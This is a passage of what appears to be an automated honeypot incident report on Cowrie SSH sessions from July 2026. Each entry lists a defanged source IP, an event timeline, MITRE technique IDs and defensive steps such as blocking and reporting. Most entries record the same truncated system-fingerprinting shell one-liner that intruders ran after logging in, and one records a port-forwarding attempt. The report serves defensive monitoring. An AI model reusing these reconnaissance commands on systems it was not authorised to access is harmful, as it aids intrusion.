| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:59 |
| **Last Seen** | 2026-07-06 15:00 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:59:19` | `cowrie.session.connect` |
| `2026-07-06 14:59:21` | `cowrie.client.version` |
| `2026-07-06 14:59:21` | `cowrie.client.kex` |
| `2026-07-06 14:59:52` | `cowrie.login.success` |
| `2026-07-06 15:00:02` | `cowrie.session.params` |
| `2026-07-06 15:00:02` | `cowrie.command.input` |
| `2026-07-06 15:00:02` | `cowrie.command.input` |
| `2026-07-06 15:00:02` | `cowrie.command.input` |
| `2026-07-06 15:00:02` | `cowrie.command.input` |
| `2026-07-06 15:00:02` | `cowrie.command.input` |
| `2026-07-06 15:00:02` | `cowrie.command.success` |
| `2026-07-06 15:00:02` | `cowrie.command.input` |
| `2026-07-06 15:00:02` | `cowrie.command.input` |
| `2026-07-06 15:00:02` | `cowrie.command.input` |
| `2026-07-06 15:00:02` | `cowrie.command.input` |
| `2026-07-06 15:00:03` | `cowrie.log.closed` |
| `2026-07-06 15:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd0b6dd829b6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 15:00 |
| **Last Seen** | 2026-07-06 15:00 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:00:39` | `cowrie.session.connect` |
| `2026-07-06 15:00:40` | `cowrie.client.version` |
| `2026-07-06 15:00:40` | `cowrie.client.kex` |
| `2026-07-06 15:00:46` | `cowrie.login.success` |
| `2026-07-06 15:00:50` | `cowrie.session.params` |
| `2026-07-06 15:00:50` | `cowrie.command.input` |
| `2026-07-06 15:00:51` | `cowrie.log.closed` |
| `2026-07-06 15:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80b6804c8a20

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:01 |
| **Last Seen** | 2026-07-06 15:01 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:01:18` | `cowrie.session.connect` |
| `2026-07-06 15:01:21` | `cowrie.client.version` |
| `2026-07-06 15:01:21` | `cowrie.client.kex` |
| `2026-07-06 15:01:36` | `cowrie.login.success` |
| `2026-07-06 15:01:42` | `cowrie.session.params` |
| `2026-07-06 15:01:42` | `cowrie.command.input` |
| `2026-07-06 15:01:42` | `cowrie.command.input` |
| `2026-07-06 15:01:42` | `cowrie.command.input` |
| `2026-07-06 15:01:42` | `cowrie.command.input` |
| `2026-07-06 15:01:42` | `cowrie.command.input` |
| `2026-07-06 15:01:42` | `cowrie.command.success` |
| `2026-07-06 15:01:42` | `cowrie.command.input` |
| `2026-07-06 15:01:42` | `cowrie.command.input` |
| `2026-07-06 15:01:42` | `cowrie.command.input` |
| `2026-07-06 15:01:42` | `cowrie.command.input` |
| `2026-07-06 15:01:43` | `cowrie.log.closed` |
| `2026-07-06 15:01:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af2d926e9249

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:03 |
| **Last Seen** | 2026-07-06 15:03 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:03:05` | `cowrie.session.connect` |
| `2026-07-06 15:03:09` | `cowrie.client.version` |
| `2026-07-06 15:03:09` | `cowrie.client.kex` |
| `2026-07-06 15:03:31` | `cowrie.login.success` |
| `2026-07-06 15:03:36` | `cowrie.session.params` |
| `2026-07-06 15:03:36` | `cowrie.command.input` |
| `2026-07-06 15:03:36` | `cowrie.command.input` |
| `2026-07-06 15:03:36` | `cowrie.command.input` |
| `2026-07-06 15:03:36` | `cowrie.command.input` |
| `2026-07-06 15:03:36` | `cowrie.command.input` |
| `2026-07-06 15:03:36` | `cowrie.command.success` |
| `2026-07-06 15:03:36` | `cowrie.command.input` |
| `2026-07-06 15:03:36` | `cowrie.command.input` |
| `2026-07-06 15:03:36` | `cowrie.command.input` |
| `2026-07-06 15:03:36` | `cowrie.command.input` |
| `2026-07-06 15:03:40` | `cowrie.log.closed` |
| `2026-07-06 15:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2abc8ee5dab

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-06 15:04 |
| **Last Seen** | 2026-07-06 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:04:24` | `cowrie.session.connect` |
| `2026-07-06 15:04:24` | `cowrie.client.version` |
| `2026-07-06 15:04:24` | `cowrie.client.kex` |
| `2026-07-06 15:04:25` | `cowrie.login.success` |
| `2026-07-06 15:04:26` | `cowrie.session.params` |
| `2026-07-06 15:04:26` | `cowrie.command.input` |
| `2026-07-06 15:04:26` | `cowrie.log.closed` |
| `2026-07-06 15:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddfce990a7bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:04 |
| **Last Seen** | 2026-07-06 15:05 |
| **Session Duration** | 60s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:04:59` | `cowrie.session.connect` |
| `2026-07-06 15:05:05` | `cowrie.client.version` |
| `2026-07-06 15:05:05` | `cowrie.client.kex` |
| `2026-07-06 15:05:38` | `cowrie.login.success` |
| `2026-07-06 15:05:50` | `cowrie.session.params` |
| `2026-07-06 15:05:50` | `cowrie.command.input` |
| `2026-07-06 15:05:50` | `cowrie.command.input` |
| `2026-07-06 15:05:50` | `cowrie.command.input` |
| `2026-07-06 15:05:50` | `cowrie.command.input` |
| `2026-07-06 15:05:50` | `cowrie.command.input` |
| `2026-07-06 15:05:50` | `cowrie.command.success` |
| `2026-07-06 15:05:50` | `cowrie.command.input` |
| `2026-07-06 15:05:50` | `cowrie.command.input` |
| `2026-07-06 15:05:50` | `cowrie.command.input` |
| `2026-07-06 15:05:50` | `cowrie.command.input` |
| `2026-07-06 15:05:55` | `cowrie.log.closed` |
| `2026-07-06 15:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e8a914c0b7b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:07 |
| **Last Seen** | 2026-07-06 15:07 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:07:11` | `cowrie.session.connect` |
| `2026-07-06 15:07:14` | `cowrie.client.version` |
| `2026-07-06 15:07:14` | `cowrie.client.kex` |
| `2026-07-06 15:07:45` | `cowrie.login.success` |
| `2026-07-06 15:07:46` | `cowrie.session.params` |
| `2026-07-06 15:07:46` | `cowrie.command.input` |
| `2026-07-06 15:07:46` | `cowrie.command.input` |
| `2026-07-06 15:07:46` | `cowrie.command.input` |
| `2026-07-06 15:07:46` | `cowrie.command.input` |
| `2026-07-06 15:07:46` | `cowrie.command.input` |
| `2026-07-06 15:07:46` | `cowrie.command.success` |
| `2026-07-06 15:07:46` | `cowrie.command.input` |
| `2026-07-06 15:07:46` | `cowrie.command.input` |
| `2026-07-06 15:07:46` | `cowrie.command.input` |
| `2026-07-06 15:07:46` | `cowrie.command.input` |
| `2026-07-06 15:07:47` | `cowrie.log.closed` |
| `2026-07-06 15:07:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2263c641aaf8

| Field | Detail |
|---|---|
| **Source IP** | `185.70.109[.]79` |
| **First Seen** | 2026-07-06 15:08 |
| **Last Seen** | 2026-07-06 15:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:08:18` | `cowrie.session.connect` |
| `2026-07-06 15:08:19` | `cowrie.client.version` |
| `2026-07-06 15:08:19` | `cowrie.client.kex` |
| `2026-07-06 15:08:21` | `cowrie.login.success` |
| `2026-07-06 15:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.70.109[.]79` to AbuseIPDB if not already reported
- [ ] Block `185.70.109[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2bd3edd15a4

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-06 15:08 |
| **Last Seen** | 2026-07-06 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:08:22` | `cowrie.session.connect` |
| `2026-07-06 15:08:22` | `cowrie.client.version` |
| `2026-07-06 15:08:22` | `cowrie.client.kex` |
| `2026-07-06 15:08:23` | `cowrie.login.success` |
| `2026-07-06 15:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5aa34894648

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:08 |
| **Last Seen** | 2026-07-06 15:09 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:08:43` | `cowrie.session.connect` |
| `2026-07-06 15:08:48` | `cowrie.client.version` |
| `2026-07-06 15:08:48` | `cowrie.client.kex` |
| `2026-07-06 15:09:10` | `cowrie.login.success` |
| `2026-07-06 15:09:17` | `cowrie.session.params` |
| `2026-07-06 15:09:17` | `cowrie.command.input` |
| `2026-07-06 15:09:17` | `cowrie.command.input` |
| `2026-07-06 15:09:17` | `cowrie.command.input` |
| `2026-07-06 15:09:17` | `cowrie.command.input` |
| `2026-07-06 15:09:17` | `cowrie.command.input` |
| `2026-07-06 15:09:17` | `cowrie.command.success` |
| `2026-07-06 15:09:17` | `cowrie.command.input` |
| `2026-07-06 15:09:17` | `cowrie.command.input` |
| `2026-07-06 15:09:17` | `cowrie.command.input` |
| `2026-07-06 15:09:17` | `cowrie.command.input` |
| `2026-07-06 15:09:19` | `cowrie.log.closed` |
| `2026-07-06 15:09:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1018e70b645a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 15:09 |
| **Last Seen** | 2026-07-06 15:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:09:39` | `cowrie.session.connect` |
| `2026-07-06 15:09:39` | `cowrie.client.version` |
| `2026-07-06 15:09:40` | `cowrie.client.kex` |
| `2026-07-06 15:09:40` | `cowrie.login.success` |
| `2026-07-06 15:09:40` | `cowrie.direct-tcpip.request` |
| `2026-07-06 15:09:40` | `cowrie.direct-tcpip.data` |
| `2026-07-06 15:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13ab53cde618

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:10 |
| **Last Seen** | 2026-07-06 15:10 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:10:23` | `cowrie.session.connect` |
| `2026-07-06 15:10:27` | `cowrie.client.version` |
| `2026-07-06 15:10:27` | `cowrie.client.kex` |
| `2026-07-06 15:10:43` | `cowrie.login.success` |
| `2026-07-06 15:10:46` | `cowrie.session.params` |
| `2026-07-06 15:10:46` | `cowrie.command.input` |
| `2026-07-06 15:10:46` | `cowrie.command.input` |
| `2026-07-06 15:10:46` | `cowrie.command.input` |
| `2026-07-06 15:10:46` | `cowrie.command.input` |
| `2026-07-06 15:10:47` | `cowrie.command.input` |
| `2026-07-06 15:10:47` | `cowrie.command.success` |
| `2026-07-06 15:10:47` | `cowrie.command.input` |
| `2026-07-06 15:10:47` | `cowrie.command.input` |
| `2026-07-06 15:10:47` | `cowrie.command.input` |
| `2026-07-06 15:10:47` | `cowrie.command.input` |
| `2026-07-06 15:10:49` | `cowrie.log.closed` |
| `2026-07-06 15:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b3ab1dd0ce2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 15:11 |
| **Last Seen** | 2026-07-06 15:12 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:11:56` | `cowrie.session.connect` |
| `2026-07-06 15:12:00` | `cowrie.client.version` |
| `2026-07-06 15:12:00` | `cowrie.client.kex` |
| `2026-07-06 15:12:11` | `cowrie.login.success` |
| `2026-07-06 15:12:13` | `cowrie.session.params` |
| `2026-07-06 15:12:13` | `cowrie.command.input` |
| `2026-07-06 15:12:13` | `cowrie.command.input` |
| `2026-07-06 15:12:13` | `cowrie.command.input` |
| `2026-07-06 15:12:13` | `cowrie.command.input` |
| `2026-07-06 15:12:13` | `cowrie.command.input` |
| `2026-07-06 15:12:13` | `cowrie.command.success` |
| `2026-07-06 15:12:13` | `cowrie.command.input` |
| `2026-07-06 15:12:13` | `cowrie.command.input` |
| `2026-07-06 15:12:13` | `cowrie.command.input` |
| `2026-07-06 15:12:13` | `cowrie.command.input` |
| `2026-07-06 15:12:15` | `cowrie.log.closed` |
| `2026-07-06 15:12:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-116791c57c74

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 15:11 |
| **Last Seen** | 2026-07-06 15:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:11:57` | `cowrie.session.connect` |
| `2026-07-06 15:11:57` | `cowrie.client.version` |
| `2026-07-06 15:11:57` | `cowrie.client.kex` |
| `2026-07-06 15:11:58` | `cowrie.login.success` |
| `2026-07-06 15:11:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7ef85c38844

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 15:11 |
| **Last Seen** | 2026-07-06 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:11:58` | `cowrie.session.connect` |
| `2026-07-06 15:11:58` | `cowrie.client.version` |
| `2026-07-06 15:11:58` | `cowrie.client.kex` |
| `2026-07-06 15:11:58` | `cowrie.login.success` |
| `2026-07-06 15:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6ceb401ac66

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 15:12 |
| **Last Seen** | 2026-07-06 15:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:12:01` | `cowrie.session.connect` |
| `2026-07-06 15:12:01` | `cowrie.client.version` |
| `2026-07-06 15:12:01` | `cowrie.client.kex` |
| `2026-07-06 15:12:01` | `cowrie.login.success` |
| `2026-07-06 15:12:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54bdbb08ee5d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 15:12 |
| **Last Seen** | 2026-07-06 15:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:12:02` | `cowrie.session.connect` |
| `2026-07-06 15:12:02` | `cowrie.client.version` |
| `2026-07-06 15:12:02` | `cowrie.client.kex` |
| `2026-07-06 15:12:02` | `cowrie.login.success` |
| `2026-07-06 15:12:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0227310b9f49

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 15:12 |
| **Last Seen** | 2026-07-06 15:12 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 15:12:26` | `cowrie.session.connect` |
| `2026-07-06 15:12:28` | `cowrie.client.version` |
| `2026-07-06 15:12:28` | `cowrie.client.kex` |
| `2026-07-06 15:12:35` | `cowrie.login.success` |
| `2026-07-06 15:12:38` | `cowrie.session.params` |
| `2026-07-06 15:12:38` | `cowrie.command.input` |
| `2026-07-06 15:12:39` | `cowrie.log.closed` |
| `2026-07-06 15:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-292d2e8895a3

| Field | Detail |
